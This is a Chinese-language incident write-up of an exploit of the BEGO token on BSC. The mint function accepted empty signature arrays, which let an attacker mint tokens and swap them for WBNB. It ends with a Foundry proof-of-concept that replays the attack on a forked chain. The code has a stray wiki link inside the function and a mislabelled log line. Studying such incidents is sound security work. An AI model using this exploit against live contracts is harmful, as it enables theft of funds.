[toc]
`攻击者通过在mint代币的时候，传入空的rsv来绕开签名的检查，获取12个WBNB的利润`

## 事件基本情况
```
tx: 0x9f4ef3cc55b016ea6b867807a09f80d1b2e36f6cd6fccfaf0182f46060332c57
区块链：bsc
发送者: 0xde01f6ce91e4f4bdb94bb934d30647d72182320f
受害者: 0xc342774492b54ce5F8ac662113ED702Fc1b34972
攻击合约: 0x08a525104ea2a92abbce8e4e61c667eed56f3b42
调用函数: 0x28b5e32b
区块高度: 22315680
漏洞点：不恰当的函数逻辑。
```

## hacker攻击流程 
1. 调用BEGO的mint方法，传入的rsv为空，可以绕开合约签名的检查。并将接收者设置为PancakeSwap V2: BGEO。
2. 用PancakeSwap V2: BGEO的swap将BEGO兑换为WBNB发送给sender

  流程图如下
  ![[Pasted image 20230521144812.png]]
  漏洞方法如图
![[Pasted image 20230521145009.png]]

## 攻击点复刻方式
1. 创建攻击合约
2. 在攻击方法中调用mint，传入空的rsv
3. 将mint的BEGO去兑换为WBNB

## 攻击模拟结果图

![[Pasted image 20230521152255.png]]

## 事件总结

`一定要对传入的参数进行特殊性检查，防止被黑客利用`

## 攻击代码
```
// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.10;

  

import "forge-std/Test.sol";

import "./UniversalInterface.sol";

  

// 定义常量

IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

address constant BEGO = 0xc342774492b54ce5F8ac662113ED702Fc1b34972;

IPancakeRouter02 constant Router = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

uint256 constant BlockNumber = 22315679;

  
  

// 定义接口

interface BEGOERC20 {

        function mint(

        uint256 _amount,

        string memory _txHash,

        address _receiver,

        bytes32[] memory _r,

        bytes32[] memory _s,

        uint8[] memory _v

    ) external;

}

  

// 攻击合约

contract Exploit is Test{

  

// 设置攻击环境

    function setUp() public {

        vm.createSelectFork("bsc", BlockNumber);

    }

  

// 攻击函数

    function testAttack() public {

        // 攻击前WBNB

        console.log("WBNB owned before attack:",WBNB.balanceOf(address(this)));

        bytes32 [] memory _r = new bytes32[](0);

        bytes32 [] memory _s = new bytes32[](0);

        uint8 [] memory _v = new uint8[](0);

        BEGOERC20(BEGO).mint(1000000000000000000000000000000, "t", address(this), _r, _s, _v);

        BEGOToWBNB();

        // 攻击后WBNB

        console.log("WBNB owned before attack:",WBNB.balanceOf(address(this)));
[[ethernaut 第16-~关]]
    }

  

    function BEGOToWBNB() internal {

        IERC20(BEGO).approve(address(Router), type(uint).max);

        address[] memory path = new address[](2);

        path[0] = address(BEGO);

        path[1] = address(WBNB);

        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(

            IERC20(BEGO).balanceOf(address(this)),

            0,

            path,

            address(this),

            block.timestamp

        );

    }

}
```
`感觉对有帮助的可以点个赞，谢谢♥；如果喜欢的话可以订阅，我会持续更新合约漏洞事件。`
